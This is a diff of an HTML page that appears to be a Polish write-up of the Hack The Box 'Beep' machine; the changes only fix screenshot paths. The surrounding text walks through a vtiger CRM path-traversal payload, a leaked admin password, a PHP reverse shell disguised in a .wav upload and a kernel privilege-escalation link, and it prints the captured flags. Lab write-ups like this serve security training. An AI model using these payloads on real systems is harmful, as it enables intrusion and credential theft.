@@ -293,12 +293,12 @@ Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
 </code></pre></div><hr>
 <h2 id="certifikat">Certifikat<a hidden class="anchor" aria-hidden="true" href="#certifikat">#</a></h2>
 <p>Certyfikat wygasł 04/07/2018</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210810183914.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210810183914.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -oA beep -T4 -p- 10.10.10.7
 </code></pre></div><hr>
 <h2 id="configphp">config.php<a hidden class="anchor" aria-hidden="true" href="#configphp">#</a></h2>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210811011729.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811011729.png" alt=""  />
 </p>
 <hr>
 <h1 id="versions">Versions<a hidden class="anchor" aria-hidden="true" href="#versions">#</a></h1>
@@ -307,7 +307,7 @@ Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
 <p>FreePBX 2.8.1.4</p>
 <hr>
 <h1 id="lfi-vtiger-crm-510">LFI vtiger CRM 5.1.0<a hidden class="anchor" aria-hidden="true" href="#lfi-vtiger-crm-510">#</a></h1>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210811012053.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811012053.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
@@ -411,19 +411,19 @@ ARI_ADMIN_PASSWORD<span style="color:#f92672">=</span>jEhdIekWmdjE
 
 </code></pre></div><p><code>admin:jEhdIekWmdjE</code></p>
 <hr>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210811013102.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811013102.png" alt=""  />
 </p>
 <hr>
 <h2 id="upload-panel">Upload panel<a hidden class="anchor" aria-hidden="true" href="#upload-panel">#</a></h2>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210811022709.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811022709.png" alt=""  />
 </p>
 <p>Pobranie dowolnego pliku audio z rozszerzeniem .wav</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210811022825.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811022825.png" alt=""  />
 </p>
 <p>Połączenie song.wav z shellem.php</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat song.wav reverse-shell-win.wav.php &gt; shell.php
 </code></pre></div><p>Upload shell.php na serwer</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210811022911.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811022911.png" alt=""  />
 </p>
 <p>Ścieżka u góry</p>
 <p><code>Unable to locate /var/lib/asterisk/sounds/custom/shell.php with a a valid suffix</code></p>
@@ -431,20 +431,20 @@ ARI_ADMIN_PASSWORD<span style="color:#f92672">=</span>jEhdIekWmdjE
 <h2 id="wykorzystanie-podatności-lfi-do-uruchomienia-shellphp--nasłuchiwanie-na-porcie-9000">Wykorzystanie podatności LFI do uruchomienia shell.php / nasłuchiwanie na porcie 9000<a hidden class="anchor" aria-hidden="true" href="#wykorzystanie-podatności-lfi-do-uruchomienia-shellphp--nasłuchiwanie-na-porcie-9000">#</a></h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">view-source:https://10.10.10.7/vtigercrm/graph.php?current_language<span style="color:#f92672">=</span>../../../../../../../../var/lib/asterisk/sounds/custom/shell.php%00&amp;module<span style="color:#f92672">=</span>Accounts&amp;action
 </code></pre></div><p>Otrzymanie shella</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210811023018.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811023018.png" alt=""  />
 </p>
 <p>user.txt</p>
 <p><code>7ed600b92945d63e473d72044df63b6f</code></p>
 <hr>
 <h1 id="privilages-escalation">Privilages Escalation<a hidden class="anchor" aria-hidden="true" href="#privilages-escalation">#</a></h1>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210811023726.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811023726.png" alt=""  />
 </p>
 <p>Linux Kernel 2.6.18 &lt; 2.6.18-20 - Local Privilege Escalation</p>
 <p><a href="https://www.exploit-db.com/exploits/10613">https://www.exploit-db.com/exploits/10613</a></p>
 <p>Albo inny sposób:</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210811025321.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811025321.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210811025304.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811025304.png" alt=""  />
 </p>
 <p>root.txt</p>
 <p><code>0e965a7038532b02785e5b63cdababdc</code></p>
